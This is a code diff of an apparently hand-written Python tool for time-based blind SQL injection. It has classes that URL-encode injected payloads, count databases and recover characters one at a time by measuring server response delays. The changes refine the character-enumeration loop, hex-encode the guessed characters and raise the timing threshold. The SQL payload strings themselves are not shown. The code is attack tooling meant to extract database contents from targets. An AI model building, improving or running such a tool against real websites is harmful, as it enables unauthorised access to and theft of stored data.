@@ -57,7 +57,6 @@ class HTTPrequest():
         self.payload_parts = self._url_encode_path()
         self.payload_parts = self._url_encode_params()
         self.payload_parts = self._url_encode_query()
-        print(self.payload_parts.query)
         return self.payload_parts.geturl()
 
     def _parse_url(self, payload):
@@ -77,7 +76,7 @@ class HTTPrequest():
     def _url_encode_query(self):
         """ Encode the query/queries of a url.  """
         self.query = self.payload_parts.query
-        return self.payload_parts._replace(query=urllib.parse.quote(self.query, safe='&=,'))
+        return self.payload_parts._replace(query=urllib.parse.quote(self.query, safe='&='))
 
 ###### Injection base class ######
 
@@ -106,8 +105,7 @@ class BaseInjection(HTTPrequest):
                 print('Number of databases found = ',i , ', with a response time of ', self.total_time)
 
     def get_databases(self, query):
-        self.payload = self.url + query
-        self._find_chars_used()
+        self._find_chars_used(query)
 
     def get_table_names(self):
         pass
@@ -115,16 +113,16 @@ class BaseInjection(HTTPrequest):
     def get_table_columns(self):
         pass
 
-    def _find_chars_used(self):
+    def _find_chars_used(self, query):
         """ Iterate over legal characters to find a subset that is used. """
         for char in self.CHAR_SET:
-            print(self.payload.format(char))
+            self.payload = self.url + query
             self.time_start = time.time()
-            self.res = self.send_request(self.payload.format(char))
+            self.res = self.send_request(self.payload.format(hex(ord(char))))
             self.time_finish = time.time()
             self.total_time = self.time_finish - self.time_start
-            if(self.total_time > 2):
-                print('Character found: ', + char)
+            if(self.total_time > 5):
+                print('Character found: ', char, ' ... in response time of', self.total_time)
 
 ###### MySQL ######
 
